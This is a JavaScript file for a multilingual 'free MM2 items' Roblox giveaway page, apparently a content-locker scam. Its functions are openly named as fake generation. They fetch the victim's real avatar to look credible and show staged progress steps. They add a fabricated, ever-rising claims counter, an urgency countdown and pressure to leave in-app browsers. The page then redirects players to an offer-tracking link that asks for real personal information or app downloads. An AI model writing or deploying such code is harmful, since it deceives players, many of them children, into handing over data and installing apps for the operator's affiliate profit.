(() => {

    const getById = (id) => document.getElementById(id);

    /* =========================================================
       GENERATOR MODAL STATE
    ========================================================= */
    let _genItemName = "";
    let _genItemImg  = "";
    let _genUsername = "";
    let _genTimerInterval = null;

    /* ─── Open modal ─── */
    window.openLocker = (itemName, itemImg) => {
        _genItemName = itemName || "";
        _genItemImg  = itemImg  || "";

        // Reset to screen 1
        _showGenScreen(1);
        const input = getById("gen-username-input");
        const err   = getById("gen-error");
        if (input) input.value = "";
        if (err)   err.textContent = "";

        // Populate item preview
        const previewImg  = getById("gen-item-img");
        const previewName = getById("gen-item-name");
        if (previewImg && _genItemImg)  previewImg.src = _genItemImg;
        if (previewName && _genItemName) previewName.textContent = _genItemName;

        // Reset progress steps
        [1,2,3,4].forEach(i => {
            const step = getById(`gstep-${i}`);
            const icon = getById(`gstep-${i}-icon`);
            if (step) step.classList.remove("done","active");
            if (icon) icon.innerHTML = `<span class="gen-step-num">${i}</span>`;
        });
        const bar = getById("gen-progress-bar");
        if (bar) bar.style.width = "0%";

        document.getElementById("gen-modal").classList.add("open");
        setTimeout(() => input?.focus(), 80);
    };

    window.closeGenModal = () => {
        document.getElementById("gen-modal").classList.remove("open");
        clearInterval(_genTimerInterval);
    };

    function _showGenScreen(n) {
        [1,2,3].forEach(i => {
            const s = getById(`gen-screen-${i}`);
            if (s) s.classList.toggle("active", i === n);
        });
    }

    /* ─── Resolve a Roblox username and load its public avatar ─── */
    async function _fetchRobloxAvatar(username) {
        let userId = null;
        let displayName = username;

        // Match the example site's proxy-based username lookup.
        try {
            const response = await fetch("https://users.roproxy.com/v1/usernames/users", {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ usernames: [username], excludeBannedUsers: false })
            });
            if (response.ok) {
                const data = await response.json();
                const user = data?.data?.[0];
                if (user?.id) {
                    userId = user.id;
                    displayName = user.displayName || user.name || username;
                }
            }
        } catch (error) {
            console.warn("Roblox username lookup failed, falling back to search", error);
        }

        // Fallback for usernames the exact lookup does not resolve.
        if (!userId) {
            try {
                const response = await fetch(
                    `https://users.roproxy.com/v1/users/search?keyword=${encodeURIComponent(username)}&limit=10`
                );
                if (response.ok) {
                    const data = await response.json();
                    const exact = data?.data?.find(user =>
                        user.name && user.name.toLowerCase() === username.toLowerCase()
                    );
                    const user = exact || data?.data?.[0];
                    if (user?.id) {
                        userId = user.id;
                        displayName = user.displayName || user.name || username;
                    }
                }
            } catch (error) {
                console.warn("Roblox user search failed", error);
            }
        }

        if (!userId) return { name: username, displayName, avatarUrl: null };

        let avatarUrl = null;
        try {
            const response = await fetch(
                `https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=${encodeURIComponent(userId)}&size=150x150&format=Png&isCircular=false`
            );
            if (response.ok) {
                const data = await response.json();
                avatarUrl = data?.data?.[0]?.imageUrl || null;
            }
        } catch (error) {
            console.warn("Roblox headshot lookup failed", error);
        }

        // Match the example site's full-avatar fallback.
        if (!avatarUrl) {
            try {
                const response = await fetch(
                    `https://thumbnails.roproxy.com/v1/users/avatar?userIds=${encodeURIComponent(userId)}&size=150x150&format=Png&isCircular=false`
                );
                if (response.ok) {
                    const data = await response.json();
                    avatarUrl = data?.data?.[0]?.imageUrl || null;
                }
            } catch (error) {
                console.warn("Roblox full avatar lookup failed", error);
            }
        }

        return { name: username, displayName, avatarUrl };
    }

    /* ─── Screen 1 → 2: Start fake generation ─── */
    window.startFakeGen = async () => {
        const input = getById("gen-username-input");
        const err   = getById("gen-error");
        const username = input ? input.value.trim() : "";

        if (!username) {
            if (err) err.textContent = "Please enter your Roblox username.";
            input?.focus();
            return;
        }
        if (err) err.textContent = "";
        _genUsername = username;

        // Keep the submitted username visible even if the public avatar lookup is slow or unavailable.
        const successUsername = getById("gen-success-username");
        if (successUsername) successUsername.textContent = _genUsername;

        const progHeader = document.querySelector(".gen-progress-header");
        if (progHeader) progHeader.style.display = "flex";

        _showGenScreen(2);

        // Fetch public Roblox user data in the background so the progress UI is not delayed.
        _fetchRobloxAvatar(username)
            .then(user => {
                const scannerAvatar = getById("scanner-avatar-img");
                const successUserImg = getById("gen-success-user-img");
                const successUsername = getById("gen-success-username");

                if (scannerAvatar) scannerAvatar.src = user.avatarUrl;
                if (successUserImg) successUserImg.src = user.avatarUrl;
                if (successUsername) successUsername.textContent = user.name || _genUsername;
            })
            .catch(error => console.warn("Roblox avatar fetch error:", error));

        await _runFakeProgress(username);
    };

    async function _runFakeProgress(username) {
        const scannerContainer = getById("avatar-scanner-container");
        if (scannerContainer) scannerContainer.classList.add("scanning");
        
        const steps = [
            { id: 1, label: "Locating account",    sub: `Found: ${username}`,           bar: 25  },
            { id: 2, label: "Generating item",      sub: `Item prepared: ${_genItemName || "item"}`, bar: 55  },
            { id: 3, label: "Encrypting transfer",  sub: "Transfer encrypted ✓",         bar: 80  },
            { id: 4, label: "Ready to deliver",     sub: "Verification required",         bar: 100 },
        ];

        const labelEl = getById("gen-progress-label");
        const barEl   = getById("gen-progress-bar");

        for (const s of steps) {
            const stepEl = getById(`gstep-${s.id}`);
            const iconEl = getById(`gstep-${s.id}-icon`);
            const subEl  = getById(`gstep-${s.id}-sub`);

            if (stepEl) stepEl.classList.add("active");
            if (labelEl) labelEl.textContent = s.label + "...";

            await _delay(900 + Math.random() * 600);

            if (subEl)  subEl.textContent  = s.sub;
            if (stepEl) { stepEl.classList.remove("active"); stepEl.classList.add("done"); }
            if (iconEl) iconEl.innerHTML = "✓";
            if (barEl)  barEl.style.width = s.bar + "%";

            await _delay(200);
        }
        
        if (scannerContainer) scannerContainer.classList.remove("scanning");

        if (labelEl) labelEl.textContent = "Done! Ready to claim.";

        // Populate screen 3 (Verification)
        const finalItem = getById("gen-final-item");
        const successImg = getById("gen-success-item-img");

        if (finalItem) finalItem.textContent = _genItemName;
        if (successImg && _genItemImg) successImg.src = _genItemImg;

        // Brief delay so user sees "Done!" message
        await _delay(800);

        // Start countdown timer
        _startTimer(299);

        // Show verification screen
        _showGenScreen(3);
    }

    function _startTimer(seconds) {
        clearInterval(_genTimerInterval);
        const el = getById("gen-timer");
        let remaining = seconds;
        const tick = () => {
            if (!el) return;
            const m = Math.floor(remaining / 60);
            const s = remaining % 60;
            el.textContent = `${m}:${s.toString().padStart(2,"0")}`;
            if (remaining <= 0) { clearInterval(_genTimerInterval); return; }
            remaining--;
        };
        tick();
        _genTimerInterval = setInterval(tick, 1000);
    }

    function _delay(ms) { return new Promise(r => setTimeout(r, ms)); }

    /* =========================================================
       iOS / TikTok popup
    ========================================================= */
    const showIosPopup = () => {
        const popup = getById("ios-popup");
        if (popup) popup.style.display = "flex";
    };

    const isIos = () => {
        const ua = navigator.userAgent || "";
        const pl = navigator.platform || "";
        return /iPad|iPhone|iPod/.test(ua) || /iPad|iPhone|iPod/.test(pl) ||
            (navigator.maxTouchPoints > 1 && /Mac/.test(pl));
    };

    const isInAppBrowser = () =>
        /FBAN|FBAV|Instagram|Line|Twitter|Snapchat|TikTok|Pinterest|Telegram|WhatsApp|Messenger|LinkedIn/i
            .test(navigator.userAgent || "");

    const isTikTokWebView = () =>
        /TikTok|TTWebView|musical_ly|Bytedance|ByteDance|aweme/i.test(navigator.userAgent || "");

    const shouldForcePopup = () => window.location.search.includes("showPopup=1");

    const maybeShowIosPopup = () => {
        if (isTikTokWebView() || shouldForcePopup()) { showIosPopup(); return; }
        if (isIos() && isInAppBrowser()) showIosPopup();
    };

    /* =========================================================
       INIT
    ========================================================= */
    const init = () => {
        // Language switcher toggle — custom dropdown
        const langBtn = document.getElementById("lang-button");
        const langSelect = document.getElementById("language-select");
        const langSwitcher = document.querySelector(".lang-switcher");
        if (langBtn && langSelect && langSwitcher) {
            langSelect.style.display = "none";
            const dropdown = document.createElement("div");
            dropdown.className = "lang-dropdown";
            Array.from(langSelect.options).forEach(opt => {
                const item = document.createElement("div");
                item.className = "lang-dropdown-item";
                item.textContent = opt.textContent;
                item.dataset.value = opt.value;
                item.addEventListener("click", (e) => {
                    e.stopPropagation();
                    langSelect.value = opt.value;
                    langSelect.dispatchEvent(new Event("change"));
                    const label = langBtn.querySelector(".lang-label");
                    if (label) label.textContent = opt.value.toUpperCase();
                    dropdown.style.display = "none";
                });
                dropdown.appendChild(item);
            });
            langSwitcher.appendChild(dropdown);
            langBtn.addEventListener("click", (e) => {
                e.stopPropagation();
                e.preventDefault();
                const isOpen = dropdown.style.display === "block";
                dropdown.style.display = isOpen ? "none" : "block";
            });
            document.addEventListener("click", () => {
                dropdown.style.display = "none";
            });
        }
        maybeShowIosPopup();
        setTimeout(maybeShowIosPopup, 500);
        initI18n();
        document.body?.classList.add("is-ready");

        // Delegate all Claim button clicks → openLocker with item data
        document.addEventListener("click", (e) => {
            const btn = e.target.closest(".btn-claim");
            if (!btn) return;
            e.preventDefault();
            const card = btn.closest(".item-card");
            const name  = card?.querySelector(".item-name")?.textContent?.trim() || "";
            const imgEl = card?.querySelector(".item-image img");
            const img   = imgEl ? imgEl.src : "";
            window.openLocker(name, img);
        });

    };

    if (document.readyState === "loading") {
        document.addEventListener("DOMContentLoaded", init);
    } else {
        init();
    }


})();


/* =========================================================
   i18n
========================================================= */
function initI18n() {
    const translations = {
        en: {
            hero_title_top: "FREE ITEMS · MURDER MYSTERY 2",
            hero_title_bottom: "ITEMS",
            hero_subtitle: "Tap claim and unlock your free MM2 godly drop.",
            cta_claim: "Claim Now",
            hero_live: "Live claims: {count} today",
            social_proof: "Players claiming right now",
            claim_btn: "Claim",
            ios_title: "Open in Browser Required",
            ios_text: "Please click on the <strong>three dots (⋯)</strong> at the top and select <strong>\"Open in Browser\"</strong> to claim your free MM2 items.",
            gen_header_title: "Free MM2 Drop",
            gen_header_sub: "MM2 Free Items • v3.0",
            // Note: gen_header_sub not used in HTML - kept for reference
            gen_free_drop: "FREE DROP",
            gen_desc: "Enter your Roblox username to start generating your free Murder Mystery 2 item.",
            gen_input_placeholder: "Your Roblox username",
            gen_btn_claim: "Claim Now",
            gen_security: "Secure connection · No password required",
            gen_connecting: "Connecting to server...",
            gen_step1_title: "Locating account",
            gen_step1_sub_found: "Found: ",
            gen_step1_sub: "Searching Roblox servers...",
            gen_step2_title: "Generating item",
            gen_step2_sub_prepared: "Item prepared: ",
            gen_step2_sub: "Preparing your drop...",
            gen_step3_title: "Encrypting transfer",
            gen_step3_sub_done: "Transfer encrypted ✓",
            gen_step3_sub: "Securing your reward...",
            gen_step4_title: "Ready to deliver",
            gen_step4_sub_wait: "Verification required",
            gen_step4_sub: "Waiting for verification...",
            gen_done_ready: "Done! Ready to claim.",
            gen_username_error: "Please enter your Roblox username.",
            gen_success_title: "Item Generated!",
            gen_success_sub: "Your <strong id=\"gen-final-item\"></strong> is ready for <strong id=\"gen-final-user\"></strong>. Please complete one of the tasks below to claim it.",
            gen_offers_loading: "Fetching latest tasks...",
            gen_verified_ready: "✓ Verified & Ready",
            gen_waiting_completion: "Waiting for task completion...",
            gen_expires_timer: "This offer expires in <span id=\"gen-timer\">4:59</span>",
            gen_no_offers: "No tasks currently available for your region.",
            gen_error_offers: "Error fetching verification tasks. Please try again.",
            gen_redirecting: "Verification Successful! Redirecting...",
            gen_inst_title: "How to unlock:",
            gen_inst_step1: "Click one of the green buttons above.",
            gen_inst_step2: "Complete the task (e.g. enter real info, download an app).",
            gen_inst_step3: "Your item will be delivered to your account instantly.",
            gen_connected: "CONNECTED",
            gen_ready: "READY"
        },
        es: {
            hero_title_top: "OBTÉN OBJETOS GRATIS DE MM2",
            hero_title_bottom: "OBJETOS",
            hero_subtitle: "Para jugadores de Roblox. Pulsa reclamar y desbloquea tu drop gratis de MM2.",
            cta_claim: "Reclamar Ahora",
            hero_live: "Reclamos en vivo: {count} hoy",
            social_proof: "Jugadores reclamando ahora",
            claim_btn: "Reclamar",
            ios_title: "Se requiere navegador",
            ios_text: "Pulsa los <strong>tres puntos (⋯)</strong> arriba y selecciona <strong>\"Abrir en el navegador\"</strong> para reclamar tus objetos de MM2.",
            gen_header_title: "Generador MM2 Gratis",
            gen_header_sub: "Herramienta de Objetos Gratis • v2.4.1",
            gen_free_drop: "REGALO GRATIS",
            gen_desc: "Ingresa tu nombre de usuario de Roblox para generar tu objeto gratis de MM2.",
            gen_input_placeholder: "Tu nombre de usuario de Roblox",
            gen_btn_claim: "Reclamar Ahora",
            gen_security: "Conexión segura · No se requiere contraseña",
            gen_connecting: "Conectando al servidor...",
            gen_step1_title: "Localizando cuenta",
            gen_step1_sub_found: "Encontrado: ",
            gen_step1_sub: "Buscando en servidores de Roblox...",
            gen_step2_title: "Generando objeto",
            gen_step2_sub_prepared: "Objeto preparado: ",
            gen_step2_sub: "Preparando tu regalo...",
            gen_step3_title: "Encriptando transferencia",
            gen_step3_sub_done: "Transferencia encriptada ✓",
            gen_step3_sub: "Asegurando tu recompensa...",
            gen_step4_title: "Listo para entregar",
            gen_step4_sub_wait: "Verificación requerida",
            gen_step4_sub: "Esperando verificación...",
            gen_done_ready: "¡Hecho! Listo para reclamar.",
            gen_username_error: "Por favor ingresa tu nombre de usuario de Roblox.",
            gen_success_title: "¡Objeto Generado!",
            gen_success_sub: "Tu <strong id=\"gen-final-item\"></strong> está listo para <strong id=\"gen-final-user\"></strong>. Completa una de las tareas siguientes para reclamarlo.",
            gen_offers_loading: "Obteniendo tareas recientes...",
            gen_verified_ready: "✓ Verificado y Listo",
            gen_waiting_completion: "Esperando la finalización de la tarea...",
            gen_expires_timer: "Esta oferta expira en <span id=\"gen-timer\">4:59</span>",
            gen_no_offers: "No hay tareas disponibles para tu región actualmente.",
            gen_error_offers: "Error al obtener tareas de verificación. Inténtalo de nuevo.",
            gen_redirecting: "¡Verificación Exitosa! Redireccionando...",
            gen_inst_title: "Cómo desbloquear:",
            gen_inst_step1: "Haz clic en uno de los botones verdes de arriba.",
            gen_inst_step2: "Completa la tarea (ej. ingresa información real, descarga una app).",
            gen_inst_step3: "Tu objeto se entregará a tu cuenta al instante.",
            gen_connected: "CONECTADO",
            gen_ready: "LISTO"
        },
        fr: {
            hero_title_top: "OBJETS GRATUITS MURDER MYSTERY 2",
            hero_title_bottom: "OBJETS",
            hero_subtitle: "Pour les joueurs Roblox. Appuie pour réclamer ton drop MM2 gratuit.",
            cta_claim: "Réclamer",
            hero_live: "Réclamations: {count} aujourd'hui",
            social_proof: "Joueurs en train de réclamer",
            claim_btn: "Réclamer",
            ios_title: "Ouvre dans le navigateur",
            ios_text: "Appuie sur les <strong>trois points (⋯)</strong> en haut et choisis <strong>« Ouvrir dans le navigateur »</strong> pour réclamer tes objets MM2.",
            gen_header_title: "Générateur MM2 Gratuit",
            gen_header_sub: "Outil de Objets Gratuits • v2.4.1",
            gen_free_drop: "LIVRAISON GRATUITE",
            gen_desc: "Entrez votre nom d'utilisateur Roblox pour générer votre objet MM2 gratuit.",
            gen_input_placeholder: "Votre nom d'utilisateur Roblox",
            gen_btn_claim: "Réclamer",
            gen_security: "Connexion sécurisée · Aucun mot de passe requis",
            gen_connecting: "Connexion au serveur...",
            gen_step1_title: "Localisation du compte",
            gen_step1_sub_found: "Trouvé: ",
            gen_step1_sub: "Recherche sur les serveurs Roblox...",
            gen_step2_title: "Génération de l'objet",
            gen_step2_sub_prepared: "Objet préparé: ",
            gen_step2_sub: "Préparation de votre cadeau...",
            gen_step3_title: "Chiffrement du transfert",
            gen_step3_sub_done: "Transfert chiffré ✓",
            gen_step3_sub: "Sécurisation de votre récompense...",
            gen_step4_title: "Prêt à être livré",
            gen_step4_sub_wait: "Vérification requise",
            gen_step4_sub: "En attente de vérification...",
            gen_done_ready: "Terminé! Prêt à être réclamé.",
            gen_username_error: "Veuillez entrer votre nom d'utilisateur Roblox.",
            gen_success_title: "Objet Généré!",
            gen_success_sub: "Votre <strong id=\"gen-final-item\"></strong> est prêt pour <strong id=\"gen-final-user\"></strong>. Veuillez compléter l'une des tâches ci-dessous pour le réclamer.",
            gen_offers_loading: "Récupération des tâches récentes...",
            gen_verified_ready: "✓ Vérifié et Prêt",
            gen_waiting_completion: "En attente de la finalisation de la tâche...",
            gen_expires_timer: "Cette offre expire dans <span id=\"gen-timer\">4:59</span>",
            gen_no_offers: "Aucune tâche disponible pour votre région actuellement.",
            gen_error_offers: "Erreur lors de la récupération des tâches de vérification. Veuillez réessayer.",
            gen_redirecting: "Vérification Réussie! Redirection...",
            gen_inst_title: "Comment débloquer:",
            gen_inst_step1: "Cliquez sur l'un des boutons verts ci-dessus.",
            gen_inst_step2: "Suivez les instructions (ex: entrez des infos réelles, téléchargez une application).",
            gen_inst_step3: "Votre objet sera livré sur votre compte instantanément.",
            gen_connected: "CONNECTÉ",
            gen_ready: "PRÊT"
        },
        ar: {
            hero_title_top: "احصل على عناصر MM2 مجاناً",
            hero_title_bottom: "العناصر",
            hero_subtitle: "للاعبي روبلوكس. اضغط للمطالبة وافتح هديتك المجانية من MM2.",
            cta_claim: "اطلب الآن",
            hero_live: "مطالبات مباشرة: {count} اليوم",
            social_proof: "لاعبون يطالبون الآن",
            claim_btn: "اطلب",
            ios_title: "افتح في المتصفح",
            ios_text: "اضغط على <strong>النقاط الثلاث (⋯)</strong> بالأعلى واختر <strong>\"افتح في المتصفح\"</strong> للمطالبة بعناصر MM2 المجانية.",
            gen_header_title: "مولد MM2 المجاني",
            gen_header_sub: "أداة العناصر المجانية • v2.4.1",
            gen_free_drop: "الحصول مجاناً",
            gen_desc: "أدخل اسم المستخدم الخاص بك في Roblox لبدء توليد عنصر MM2 المجاني.",
            gen_input_placeholder: "اسم المستخدم في Roblox",
            gen_btn_claim: "احصل عليه الآن",
            gen_security: "اتصال آمن · لا يتطلب كلمة مرور",
            gen_connecting: "جاري الاتصال بالسيرفر...",
            gen_step1_title: "تحديد موقع الحساب",
            gen_step1_sub_found: "تم العثور على: ",
            gen_step1_sub: "جاري البحث في خوادم Roblox...",
            gen_step2_title: "توليد العنصر",
            gen_step2_sub_prepared: "العنصر جاهز: ",
            gen_step2_sub: "جاري تجهيز هديتك...",
            gen_step3_title: "تشفير النقل",
            gen_step3_sub_done: "تم تشفير النقل بنجاح ✓",
            gen_step3_sub: "جاري تأمين مكافأتك...",
            gen_step4_title: "جاهز للتسليم",
            gen_step4_sub_wait: "التحقق مطلوب",
            gen_step4_sub: "بانتظار عملية التحقق...",
            gen_done_ready: "تم! جاهز للاستلام.",
            gen_username_error: "يرجى إدخال اسم المستخدم الخاص بك في Roblox.",
            gen_success_title: "تم توليد العنصر!",
            gen_success_sub: "العنصر <strong id=\"gen-final-item\"></strong> الخاص بك جاهز لـ <strong id=\"gen-final-user\"></strong>. يرجى إكمال إحدى المهام أدناه للاستلام.",
            gen_offers_loading: "جاري جلب المهام الأخيرة...",
            gen_verified_ready: "✓ تم التحقق وجاهز",
            gen_waiting_completion: "بانتظار إكمال المهمة...",
            gen_expires_timer: "تنتهي صلاحية العرض في <span id=\"gen-timer\">4:59</span>",
            gen_no_offers: "لا توجد مهام متاحة لمنطقتك حالياً.",
            gen_error_offers: "خطأ في جلب مهام التحقق. يرجى المحاولة مرة أخرى.",
            gen_redirecting: "تم التحقق بنجاح! جاري التوجيه...",
            gen_inst_title: "طريقة فتح القفل:",
            gen_inst_step1: "اضغط على أحد الأزرار الخضراء أعلاه.",
            gen_inst_step2: "أكمل المهمة المطلوبة (مثل كتابة معلومات صحيحة أو تنزيل تطبيق).",
            gen_inst_step3: "سيتم تسليم العنصر إلى حسابك فوراً.",
            gen_connected: "متصل",
            gen_ready: "جاهز"
        },
        pt: {
            hero_title_top: "ITENS GRÁTIS MURDER MYSTERY 2",
            hero_title_bottom: "ITENS",
            hero_subtitle: "Para jogadores de Roblox. Toque em reivindicar e desbloqueie seu drop grátis de MM2.",
            cta_claim: "Reivindicar",
            hero_live: "Reivindicações: {count} hoje",
            social_proof: "Jogadores reivindicando agora",
            claim_btn: "Reivindicar",
            ios_title: "Abra no navegador",
            ios_text: "Toque nos <strong>três pontos (⋯)</strong> acima e selecione <strong>\"Abrir no navegador\"</strong> para resgatar seus itens do MM2.",
            gen_header_title: "Gerador MM2 Grátis",
            gen_header_sub: "Ferramenta de Itens Grátis • v2.4.1",
            gen_free_drop: "BRINDE GRÁTIS",
            gen_desc: "Insira seu nome de usuário do Roblox para gerar seu item grátis do MM2.",
            gen_input_placeholder: "Seu nome de usuário do Roblox",
            gen_btn_claim: "Resgatar Agora",
            gen_security: "Conexão segura · Sem necessidade de senha",
            gen_connecting: "Conectando ao servidor...",
            gen_step1_title: "Localizando conta",
            gen_step1_sub_found: "Encontrado: ",
            gen_step1_sub: "Buscando nos servidores do Roblox...",
            gen_step2_title: "Gerando item",
            gen_step2_sub_prepared: "Item preparado: ",
            gen_step2_sub: "Preparando seu presente...",
            gen_step3_title: "Criptografando transferência",
            gen_step3_sub_done: "Transferência criptografada ✓",
            gen_step3_sub: "Garantindo sua recompensa...",
            gen_step4_title: "Pronto para entrega",
            gen_step4_sub_wait: "Verificação necessária",
            gen_step4_sub: "Aguardando verificação...",
            gen_done_ready: "Concluído! Pronto para resgatar.",
            gen_username_error: "Por favor, insira seu nome de usuário do Roblox.",
            gen_success_title: "Item Gerado!",
            gen_success_sub: "Seu <strong id=\"gen-final-item\"></strong> está pronto para <strong id=\"gen-final-user\"></strong>. Por favor, conclua uma das tarefas abaixo para resgatá-lo.",
            gen_offers_loading: "Buscando tarefas recentes...",
            gen_verified_ready: "✓ Verificado e Pronto",
            gen_waiting_completion: "Aguardando a conclusão da tarefa...",
            gen_expires_timer: "Esta oferta expira em <span id=\"gen-timer\">4:59</span>",
            gen_no_offers: "Nenhuma tarefa disponível para sua região no momento.",
            gen_error_offers: "Erro ao buscar tarefas de verificação. Tente novamente.",
            gen_redirecting: "Verificação Bem-sucedida! Redirecionando...",
            gen_inst_title: "Como desbloquear:",
            gen_inst_step1: "Clique em um dos botões verdes acima.",
            gen_inst_step2: "Complete as instruções (ex: insira informações reais, baixe um aplicativo).",
            gen_inst_step3: "Seu item será entregue na sua conta instantaneamente.",
            gen_connected: "CONECTADO",
            gen_ready: "PRONTO"
        },
        fil: {
            hero_title_top: "LIBRENG MM2 ITEMS",
            hero_title_bottom: "ITEMS",
            hero_subtitle: "Para sa mga Roblox player. I-tap ang claim at kunin ang libreng MM2 drop.",
            cta_claim: "I-claim",
            hero_live: "Live claims: {count} ngayon",
            social_proof: "May nagki-claim ngayon",
            claim_btn: "I-claim",
            ios_title: "Buksan sa browser",
            ios_text: "I-tap ang <strong>tatlong tuldok (⋯)</strong> sa itaas at piliin ang <strong>\"Buksan sa browser\"</strong> para ma-claim ang iyong libreng MM2 items.",
            gen_header_title: "Libreng MM2 Drop",
            gen_header_sub: "Libreng Items Tool • v2.4.1",
            gen_free_drop: "LIBRENG DROP",
            gen_desc: "Ipasok ang iyong Roblox username upang makakuha ng libreng MM2 item.",
            gen_input_placeholder: "Iyong Roblox username",
            gen_btn_claim: "I-claim Ngayon",
            gen_security: "Ligtas na koneksyon · Walang kailangang password",
            gen_connecting: "Kumokonekta sa server...",
            gen_step1_title: "Hinahanap ang account",
            gen_step1_sub_found: "Nahanap: ",
            gen_step1_sub: "Hinahanap sa Roblox servers...",
            gen_step2_title: "Bino-buo ang item",
            gen_step2_sub_prepared: "Naihanda na ang item: ",
            gen_step2_sub: "Inihahanda ang iyong regalo...",
            gen_step3_title: "Ine-encrypt ang paglipat",
            gen_step3_sub_done: "Naka-encrypt ang paglipat ✓",
            gen_step3_sub: "Pinoprotektahan ang iyong gantimpala...",
            gen_step4_title: "Handa nang maihatid",
            gen_step4_sub_wait: "Kailangan ng verifikasyon",
            gen_step4_sub: "Naghihintay ng verifikasyon...",
            gen_done_ready: "Tapos na! Handa nang i-claim.",
            gen_username_error: "Mangyaring ipasok ang iyong Roblox username.",
            gen_success_title: "Binuo ang Item!",
            gen_success_sub: "Ang iyong <strong id=\"gen-final-item\"></strong> ay handa na para kay <strong id=\"gen-final-user\"></strong>. Mangyaring kumpletuhin ang isa sa mga gawain sa ibaba para ma-claim ito.",
            gen_offers_loading: "Kinukuha ang pinakabagong mga gawain...",
            gen_verified_ready: "✓ Beripikado at Handa na",
            gen_waiting_completion: "Naghihintay na matapos ang gawain...",
            gen_expires_timer: "Mag-eexpire ang alok na ito sa <span id=\"gen-timer\">4:59</span>",
            gen_no_offers: "Walang magagamit na mga gawain para sa iyong rehiyon sa kasalukuyan.",
            gen_error_offers: "Error sa pagkuha ng mga gawain sa pag-verify. Mangyaring subukan مالي.",
            gen_redirecting: "Matagumpay na Pag-verify! Nililipat...",
            gen_inst_title: "Paano i-unlock:",
            gen_inst_step1: "I-click ang isa sa mga berdeng button sa itaas.",
            gen_inst_step2: "Kumpletuhin ang gawain (hal. maglagay ng totoong impormasyon, mag-download ng app).",
            gen_inst_step3: "Agad na maihahatid ang iyong item sa iyong account.",
            gen_connected: "CONNECTED",
            gen_ready: "HANDA"
        }
    };

    const liveEl = document.querySelector('[data-i18n="hero_live"]');
    let liveCount = 1248;
    if (liveEl?.dataset?.liveCount) {
        const parsed = parseInt(liveEl.dataset.liveCount.replace(/[^0-9]/g, ""), 10);
        if (!Number.isNaN(parsed)) liveCount = parsed;
    }

    const fmt = (text, vars = {}) =>
        text.replace(/\{(\w+)\}/g, (_, k) => vars[k] != null ? vars[k] : `{${k}}`);

    const fmtNum = (v, lang) => {
        try { return new Intl.NumberFormat(lang || "en").format(v); }
        catch { return v.toLocaleString(); }
    };

    const updateLive = (lang) => {
        if (!liveEl) return;
        const dict = translations[lang] || translations.en;
        liveEl.textContent = fmt(dict.hero_live || "Live claims: {count} today", { count: fmtNum(liveCount, lang) });
    };

    const select = document.getElementById("language-select");
    const label = document.querySelector(".lang-label");
    if (!select) return;

    const applyLang = (lang) => {
        const dict = translations[lang] || translations.en;
        window.__i18n = { lang, dict };

        document.querySelectorAll("[data-i18n]").forEach(el => {
            const k = el.getAttribute("data-i18n");
            if (dict[k]) el.textContent = fmt(dict[k], { count: fmtNum(liveCount, lang) });
        });
        document.querySelectorAll("[data-i18n-html]").forEach(el => {
            const k = el.getAttribute("data-i18n-html");
            if (dict[k]) el.innerHTML = fmt(dict[k], { count: fmtNum(liveCount, lang) });
        });
        document.querySelectorAll(".btn-claim").forEach(btn => {
            if (dict.claim_btn) btn.textContent = dict.claim_btn;
        });
        if (label) label.textContent = lang.toUpperCase();
        document.documentElement.setAttribute("dir", lang === "ar" ? "rtl" : "ltr");
        updateLive(lang);
    };

    applyLang("en");
    select.addEventListener("change", e => applyLang(e.target.value));

    if (liveEl) {
        setInterval(() => {
            liveCount += Math.floor(Math.random() * 6) + 1;
            updateLive(window.__i18n?.lang || "en");
        }, 2000);
    }
}


/* =========================================================
   VERIFICATION — Simple redirect
========================================================= */
function handleVerification() {
    const btn = document.getElementById("gen-verify-btn");
    if (!btn) return;
    
    btn.textContent = "Claiming...";
    btn.style.pointerEvents = "none";
    btn.style.opacity = "0.6";
    
    setTimeout(() => {
        window.location.href = "https://trkoffer.net/cl/i/7jw51k";
    }, 600);
}
